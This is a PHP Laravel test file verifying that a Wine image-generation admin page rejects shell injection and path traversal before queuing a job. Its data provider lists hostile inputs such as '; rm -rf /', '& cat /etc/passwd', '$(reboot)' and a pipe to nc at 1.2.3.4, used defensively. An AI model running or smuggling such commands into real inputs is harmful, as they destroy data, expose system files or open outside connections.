<?php

declare(strict_types=1);

namespace Tests\Feature\Gpo;

use App\Gpo\Jobs\GenerateWineImageJob;
use App\Gpo\Services\WinePrefixScanner;
use App\Models\User;
use Illuminate\Foundation\Testing\DatabaseTransactions;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Queue;
use Livewire\Livewire;
use Mockery;
use PHPUnit\Framework\Attributes\Test;
use Tests\Concerns\BootstrapsSpatieTables;
use Tests\TestCase;

/**
 * Tests Feature Sécurité Wine — Story 16.3c AC5.2 (audit §6.F F7 corrigé).
 *
 * Vérifie que la whitelist regex est appliquée AVANT tout dispatch Job.
 * Aucun input dangereux ne doit pouvoir atteindre `make_wine_image.sh`.
 */
class WineSecurityTest extends TestCase
{
    use DatabaseTransactions;
    use BootstrapsSpatieTables;

    protected function setUp(): void
    {
        parent::setUp();
        if (!config('app.key')) {
            config(['app.key' => 'base64:' . base64_encode(random_bytes(32))]);
        }
        $this->bootstrapSpatieTables();
        Cache::lock('gpo:wine:generate-image:__default__')->forceRelease();
    }

    protected function tearDown(): void
    {
        Mockery::close();
        $this->cleanupSpatieTables();
        parent::tearDown();
    }

    private function makeAdmin(): User
    {
        $u = User::query()->create(['login' => 'wine-sec-' . bin2hex(random_bytes(3)), 'role' => 'admin', 'is_active' => true]);
        $u->givePermissionTo('server.admin');
        return $u;
    }

    private function mockScanner(array $prefixes = []): void
    {
        $mock = Mockery::mock(WinePrefixScanner::class);
        $mock->shouldReceive('list')->andReturn($prefixes);
        $mock->shouldReceive('exists')->andReturnUsing(
            fn(string $app, ?string $base = null) => $app === '' || in_array($app, $prefixes, true),
        );
        $this->app->instance(WinePrefixScanner::class, $mock);
    }

    /**
     * @return array<string, array{0: string}>
     */
    public static function maliciousInputs(): array
    {
        return [
            'shell injection ; rm -rf' => ['; rm -rf /'],
            'shell injection & cat'    => ['& cat /etc/passwd'],
            'shell injection $(...)'   => ['$(reboot)'],
            'backtick'                 => ['`whoami`'],
            'path traversal'           => ['../../etc/passwd'],
            'pipe'                     => ['firefox|nc 1.2.3.4 1234'],
            'newline'                  => ["firefox\nrm -rf /"],
            'space'                    => ['fire fox'],
            'quote'                    => ["fire'fox"],
            'absolute path'            => ['/usr/share'],
        ];
    }

    #[Test]
    #[\PHPUnit\Framework\Attributes\DataProvider('maliciousInputs')]
    public function it_rejects_malicious_application_input_without_dispatching_job(string $payload): void
    {
        Queue::fake();
        $this->mockScanner(['firefox']);
        $this->actingAs($this->makeAdmin());

        Livewire::test('pages::admin.settings.gpo.wine.index')
            ->set('selectedApplication', $payload)
            ->call('generateImage');

        Queue::assertNothingPushed();
    }

    #[Test]
    public function generate_wine_image_job_constructor_rejects_shell_injection(): void
    {
        $this->expectException(\InvalidArgumentException::class);
        new GenerateWineImageJob('; rm -rf /', 'op-uuid');
    }
}
